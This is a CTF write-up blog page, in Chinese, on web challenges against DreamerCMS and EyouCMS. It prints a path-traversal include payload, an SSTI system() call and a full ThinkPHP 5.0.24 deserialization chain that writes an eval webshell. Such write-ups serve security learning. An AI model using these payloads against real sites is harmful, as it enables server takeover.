@@ -1,0 +1,344 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="referrer" content="no-referrer" />
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>红明谷CTF 2023 Web writedup - Boogiepop Doesn&#39;t Laugh</title>
+  
+    <link rel="shortcut icon" href="/favicon.png">
+  
+  
+    <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="红明谷CTF 2023 Web writedup - Boogiepop Doesn&#39;t Laugh" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://boogipop.com/2023/04/19/%E7%BA%A2%E6%98%8E%E8%B0%B7CTF%202023%20Web%20Writeup/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2023-04-19T11:45:56.000Z" />
+  
+  <meta property="og:article:author" content="Boogipop" />
+  
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+<link rel="stylesheet" href="/css/components.css">
+
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+    
+<link rel="stylesheet" href="/css/giscus.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+    <body
+        data-color-scheme="auto"
+        data-uppercase-categories="true"
+        
+        data-rainbow-banner="true"
+        data-rainbow-banner-shown="auto"
+        data-rainbow-banner-month="6"
+        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+        
+        data-config-root="/"
+        
+        data-toc="true"
+        data-toc-max-depth="2"
+        
+        
+    >
+        <nav id="theme-nav">
+    <div class="inner">
+        <a class="title" href="/">Blog</a>
+        <div class="nav-arrow"></div>
+        <div class="nav-items">
+            <a class="nav-item nav-item-home" href="/">Home</a>
+            
+            
+            <a class="nav-item" href="/archives">Archives</a>
+            
+            
+            
+            <a class="nav-item" href="/friends">Friends</a>
+            
+            
+            
+            <a class="nav-item" href="/about">About</a>
+            
+            
+            
+            <a class="nav-item" href="/categories">Categories</a>
+            
+            
+            
+            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
+            
+            
+            
+            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
+            
+            
+        </div>
+    </div>
+</nav>
+        
+<article class="post">
+    <div class="meta">
+        
+        <div class="categories text-uppercase">
+        
+            <a href="/categories/WriteUp/">WriteUp</a>
+        
+        </div>
+        
+
+        
+        <div class="date" id="date">
+            <span>April</span>
+            <span>19,</span>
+            <span>2023</span>
+        </div>
+        
+
+        <h2 class="title">红明谷CTF 2023 Web writedup</h2>
+    </div>
+
+    <div class="divider"></div>
+
+    <div class="content">
+        <p>排名也不太好看呀，就不放出来了，CMS可能是做得比较少吧。<br>但是有一些预期知识点是值得学习了<br>这一次比赛基本全是非预期解出来的。<br>然后发现环境还没了</p>
+<h1 id="点击签到"><a href="#点击签到" class="headerlink" title="点击签到"></a>点击签到</h1><p>签到题，改一下JS源码点几下flag就出来了</p>
+<h1 id="Dreamer"><a href="#Dreamer" class="headerlink" title="Dreamer"></a>Dreamer</h1><p>Dreamercms的一个任意文件包含的漏洞</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;dreamer-cms:<span class="keyword">include</span> file=<span class="string">&#x27;../../../../../../../../../../../../etc/passwd&#x27;</span>/&#125;</span><br></pre></td></tr></table></figure>
+<p>题目告诉我们flag在根目录</p>
+<h1 id="Dreamer-renvenge"><a href="#Dreamer-renvenge" class="headerlink" title="Dreamer_renvenge"></a>Dreamer_renvenge</h1><p>这一题也是比较抽象，预期解呢听满秋大佬说是覆盖一些jar包实现RCE然后连上redis去获取flag<br>然后非预期呢，大家都是任意文件读取，和上一题一样的，flag在<code>/proc/1/environ</code><br>里，这里找了我2个小时。。。。。我当时还在想flag在哪，几乎点遍了就是忘了点这个，主要败因</p>
+<h1 id="Eyou"><a href="#Eyou" class="headerlink" title="Eyou"></a>Eyou</h1><p>小0day，这题的预期解是0day，非预期就不是了<br>非预期听山河偶像说是SSTI，也确实是，只要能进入模板管理界面就可以使用<code>&#123;if system(&#39;ls&#39;)&#125;&#123;/if&#125;</code>去rce了。<br>但是得绕过一道坎儿，那就是密保手机认证问题，解决这个问题很简单，直接本地起服务，在设置密保问题时抓包，然后把host换成环境的Host，这样就可以二次重置了。。</p>
+<h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>这题预期解才是重磅<br>是@N1k0la师傅挖出来的<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681904468123-35ca1552-d5c8-4845-a38b-a3dc6f6f03fa.png#averageHue=%236a7a52&clientId=u81861378-f6b5-4&from=paste&id=uf9c3823c&name=image.png&originHeight=1890&originWidth=3024&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=988203&status=done&style=none&taskId=u271f6a0e-1a90-498a-9121-fe0bcd54594&title=" alt="image.png"><br>application&#x2F;admin&#x2F;controller&#x2F;Field.php#channel_edit调用了unserialize，unserialize的参数无法直接控制。<br>此处反序列化的参数来自数据库的查询结果，很容易想到通过channel_add函数向数据库中插入序列化数据，非常简单的思路，但是问题却没有这么简单。<br>在channel_add函数中，如果传入的字段类型为区域，那么将无法控制默认值。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681904469277-dd8b80d0-8c43-4518-92ae-c3349ecd0c94.png#averageHue=%23788257&clientId=u81861378-f6b5-4&from=paste&id=ubc3d0c06&name=image.png&originHeight=1890&originWidth=3024&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=1064260&status=done&style=none&taskId=u9caf9ca9-cb56-49b5-a871-f72e089639b&title=" alt="image.png"><br>测试了application&#x2F;admin&#x2F;controller&#x2F;Field.php中的一些功能后，发现arctype_edit函数和channel_edit函数操作的是同一张表，此时想到也许可以用arctype_edit代替channel_edit来修改数据库中的数据。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681904470020-2f2fd264-2529-4c5e-86e8-d067f5dcb47f.png#averageHue=%232a2a28&clientId=u81861378-f6b5-4&from=paste&id=ub9aa71c9&name=image.png&originHeight=1936&originWidth=2704&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=1730737&status=done&style=none&taskId=uef2ff026-5283-42f3-8940-2835217036b&title=" alt="image.png"><br>果然可以。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681904469531-695f4200-1cfc-4d33-83f6-11375644c9cc.png#averageHue=%23fbfbfa&clientId=u81861378-f6b5-4&from=paste&id=ud6155125&name=image.png&originHeight=1942&originWidth=3242&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=1220109&status=done&style=none&taskId=ucf2903f6-42c0-4e44-b366-d119e1f7ef7&title=" alt="image.png"><br>EyouCMS基于ThinkPHP 5.0.24，直接用ThinkPHP 5.0.24的反序列化链。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line"> namespace think\cache\driver;</span><br><span class="line"> class File</span><br><span class="line"> &#123;</span><br><span class="line">     protected $tag=&#x27;t&#x27;;</span><br><span class="line">     protected $options = [</span><br><span class="line">         &#x27;expire&#x27;        =&gt; 0,</span><br><span class="line">         &#x27;cache_subdir&#x27;  =&gt; false,</span><br><span class="line">         &#x27;prefix&#x27;        =&gt; false,</span><br><span class="line">         &#x27;path&#x27;          =&gt; &#x27;php://filter/string.rot13/resource=&lt;?cuc @riny($_TRG[_]);?&gt;/../a.php&#x27;,</span><br><span class="line">         &#x27;data_compress&#x27; =&gt; false,</span><br><span class="line">     ];</span><br><span class="line"> &#125;</span><br><span class="line"> namespace think\session\driver;</span><br><span class="line"> use think\cache\driver\File;</span><br><span class="line"> class Memcached</span><br><span class="line"> &#123;</span><br><span class="line">     protected $handler;</span><br><span class="line">     function __construct()</span><br><span class="line">     &#123;</span><br><span class="line">         $this-&gt;handler=new File();</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> namespace think\console;</span><br><span class="line"> use think\session\driver\Memcached;</span><br><span class="line"> class Output</span><br><span class="line"> &#123;</span><br><span class="line">     protected $styles = [&#x27;removeWhereField&#x27;];</span><br><span class="line">     function __construct()</span><br><span class="line">     &#123;</span><br><span class="line">         $this-&gt;handle=new Memcached();</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> namespace think\model\relation;</span><br><span class="line"> use think\console\Output;</span><br><span class="line"> class HasOne</span><br><span class="line"> &#123;</span><br><span class="line">     function __construct()</span><br><span class="line">     &#123;</span><br><span class="line">         $this-&gt;query=new Output();</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line"> &#125;</span><br><span class="line"> namespace think\model;</span><br><span class="line"> use think\model\relation\HasOne;</span><br><span class="line"> class Pivot</span><br><span class="line"> &#123;</span><br><span class="line">     protected $append = [&#x27;getError&#x27;];</span><br><span class="line">     public function __construct()</span><br><span class="line">     &#123;</span><br><span class="line">         $this-&gt;error=new HasOne();</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> namespace think\process\pipes;</span><br><span class="line"> use think\model\Pivot;</span><br><span class="line"> class Windows</span><br><span class="line"> &#123;</span><br><span class="line">     public function __construct()</span><br><span class="line">     &#123;</span><br><span class="line">         $this-&gt;files=[new Pivot()];</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> $x=new Windows();</span><br><span class="line"> echo base64_encode(serialize($x));</span><br></pre></td></tr></table></figure>
+<p>因为不存在字段名称为channel_add的arctype，所以报错了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681904468374-9ba57190-a94c-4065-8a20-724b1b02c90d.png#averageHue=%23c4c3c3&clientId=u81861378-f6b5-4&from=paste&id=ue4110c18&name=image.png&originHeight=1942&originWidth=2784&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=1064122&status=done&style=none&taskId=u24b9d8e5-6512-41d6-ac03-2b44632c28b&title=" alt="image.png"><br>通过arctype_add函数新增一个字段名称为channel_add的arctype后重新发包，因为序列化数据的长度超过了最大长度500又报错了。删除了一些无关紧要的类属性同时将类属性的访问控制修改为public以缩短序列化数据的长度，最终序列化数据长度为499，极限绕过。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line"> namespace think\cache\driver;</span><br><span class="line"> class File</span><br><span class="line"> &#123;</span><br><span class="line">     public $tag=&#x27;t&#x27;;</span><br><span class="line">     public $options = [</span><br><span class="line">         &#x27;path&#x27;          =&gt; &#x27;php://filter/string.rot13/resource=&lt;?cuc @riny($_TRG[_]);?&gt;/../a.php&#x27;</span><br><span class="line">     ];</span><br><span class="line"> &#125;</span><br><span class="line"> namespace think\session\driver;</span><br><span class="line"> use think\cache\driver\File;</span><br><span class="line"> class Memcached</span><br><span class="line"> &#123;</span><br><span class="line">     public $handler;</span><br><span class="line">     function __construct()</span><br><span class="line">     &#123;</span><br><span class="line">         $this-&gt;handler=new File();</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> namespace think\console;</span><br><span class="line"> use think\session\driver\Memcached;</span><br><span class="line"> class Output</span><br><span class="line"> &#123;</span><br><span class="line">     public $styles = [&#x27;removeWhereField&#x27;];</span><br><span class="line">     function __construct()</span><br><span class="line">     &#123;</span><br><span class="line">         $this-&gt;handle=new Memcached();</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> namespace think\model\relation;</span><br><span class="line"> use think\console\Output;</span><br><span class="line"> class HasOne</span><br><span class="line"> &#123;</span><br><span class="line">     function __construct()</span><br><span class="line">     &#123;</span><br><span class="line">         $this-&gt;query=new Output();</span><br><span class="line">     &#125;</span><br><span class="line"> </span><br><span class="line"> &#125;</span><br><span class="line"> namespace think\model;</span><br><span class="line"> use think\model\relation\HasOne;</span><br><span class="line"> class Pivot</span><br><span class="line"> &#123;</span><br><span class="line">     public $append = [&#x27;getError&#x27;];</span><br><span class="line">     public function __construct()</span><br><span class="line">     &#123;</span><br><span class="line">         $this-&gt;error=new HasOne();</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> namespace think\process\pipes;</span><br><span class="line"> use think\model\Pivot;</span><br><span class="line"> class Windows</span><br><span class="line"> &#123;</span><br><span class="line">     public function __construct()</span><br><span class="line">     &#123;</span><br><span class="line">         $this-&gt;files=[new Pivot()];</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br><span class="line"> $x=new Windows();</span><br><span class="line"> echo strlen(serialize($x));</span><br><span class="line"> echo base64_encode(serialize($x));</span><br></pre></td></tr></table></figure>
+<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681904472041-dc1b3dfa-fcfa-4ed9-80a8-8859a9db8f4f.png#averageHue=%23c7c6c6&clientId=u81861378-f6b5-4&from=paste&id=u8cb7f70e&name=image.png&originHeight=1942&originWidth=2784&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=1090257&status=done&style=none&taskId=u42fcddf0-c08d-4c16-8215-2bd44ca723a&title=" alt="image.png"><br>本以为大功告成，但是调用channel_edit函数后并没有如预期那样写入webshell，发现数据库中的序列化数据少了一些字符。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681904474411-2af8b295-35df-40e7-83d0-8774514e4966.png#averageHue=%23292928&clientId=u81861378-f6b5-4&from=paste&id=ufa0fa89f&name=image.png&originHeight=1936&originWidth=2704&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=1573927&status=done&style=none&taskId=u347f3daf-59e7-4655-8914-d94726e717e&title=" alt="image.png"><br>分析源码，当传入的字段类型为区域时，默认值中的一些字符会被替换为空。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681904473784-1d2b3052-b179-481e-b808-6248bd827d20.png#averageHue=%23818459&clientId=u81861378-f6b5-4&from=paste&id=ua383f63f&name=image.png&originHeight=1890&originWidth=3024&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=1033316&status=done&style=none&taskId=u47072dcf-382d-4810-9b96-b9c0db5dd7e&title=" alt="image.png"><br>通过传入数组的方式就能够使传入的字段类型不满足if的条件，从而避免序列化数据中的一些字符被替换为空。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681904474096-8856d11f-a5b5-44c3-8c15-c28f55d615c0.png#averageHue=%23c7c6c6&clientId=u81861378-f6b5-4&from=paste&id=u669b539f&name=image.png&originHeight=1942&originWidth=2784&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=1091098&status=done&style=none&taskId=u2c10648f-57e7-45a4-9574-d1b36353504&title=" alt="image.png"><br>最后触发反序列化写入webshell。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681904475724-39aa367e-cd5b-4722-903e-1cae7670cecb.png#averageHue=%23fcfcfb&clientId=u81861378-f6b5-4&from=paste&id=ue908e57f&name=image.png&originHeight=1942&originWidth=3242&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=1001002&status=done&style=none&taskId=u0348594c-ea59-4541-8199-12fd03f7125&title=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1681904477074-dcd4c450-7bcf-420d-9c36-eeb326057db8.png#averageHue=%23dddddc&clientId=u81861378-f6b5-4&from=paste&id=ue068a6c7&name=image.png&originHeight=1942&originWidth=3242&originalType=url&ratio=1.25&rotation=0&showTitle=false&size=2072481&status=done&style=none&taskId=u2360fcee-492a-4fb3-a6a6-0659a43d492&title=" alt="image.png"></p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>还是感叹自身实力的不足呀，吐槽一下这次3个cms吧。。。。。<br>CMS还是做得少没办法，继续努力！脚踏实地的走吧</p>
+
+    </div>
+
+    
+    <div class="about">
+        <h1>About this Post</h1>
+        <div class="details">
+            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+        </div>
+        
+        <p class="tags">
+            
+            <i class="icon"></i>
+            <a href="/tags/WriteUp/" class="tag">#WriteUp</a><a href="/tags/CTF/" class="tag">#CTF</a>
+        </p>
+        
+    </div>
+    
+
+    <div class="container post-prev-next">
+        
+        <a href="/2023/04/19/%E5%B9%B4%E8%BD%BB%E4%BA%BA%E7%9A%84%E7%AC%AC%E4%B8%80%E6%8A%8AXsleaks/" class="next">
+            <div>
+                <div class="text">
+                    <p class="label">Next</p>
+                    <h3 class="title">年轻人的第一把Xsleaks</h3>
+                </div>
+            </div>
+        </a>
+        
+        
+        <a href="/2023/04/16/BUUCTF%20Web%20WriteUp%205/" class="prev">
+            <div>
+                <div class="text">
+                    <p class="label">Previous</p>
+                    <h3 class="title">BUUCTF Web Writeup 5</>
+                </div>
+            </div>
+        </a>
+        
+    </div>
+
+    
+        
+        
+        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
+        
+    
+</article>
+
+        <footer>
+    <div class="inner">
+        <div class="links">
+            
+            <div class="group">
+                <h2 class="title">Blog</h2>
+                
+                <a href="/" class="item">Blog</a>
+                
+                <a href="/archives" class="item">Archives</a>
+                
+                <a href="/tags" class="item">Tags</a>
+                
+                <a href="/categories" class="item">Categories</a>
+                
+                <a href="/search" class="item">Search</a>
+                
+                <a href="/friends" class="item">Friends</a>
+                
+                <a href="/about" class="item">About</a>
+                
+                <a href="/atom.xml" class="item">RSS</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Projects</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
+                
+            </div>
+            
+            <div class="group">
+                <h2 class="title">Me</h2>
+                
+                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+                
+                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+                
+                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+                
+                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+                
+                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
+                
+                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+                
+            </div>
+            
+        </div>
+        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
+        
+        
+            <br>
+            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+                <label>
+                    <input type="radio" value="light">
+                    <span>Light</span>
+                </label>
+                <label>
+                    <input type="radio" value="dark">
+                    <span>Dark</span>
+                </label>
+                <label>
+                    <input type="radio" value="auto">
+                    <span>Auto</span>
+                </label>
+            </div>
+        
+    </div>
+</footer>
+
+
+        
+<script src="/js/main.js"></script>
+
+        
+        
+        
+
+        
+        <script src="https://unpkg.com/scrollreveal"></script>
+		
+        <script>
+            window.addEventListener('load', () => {
+                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
+                ScrollReveal().reveal('.post-list-item .cover-img img')
+                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
+            })
+        </script>
+        
+    </body>
+</html>
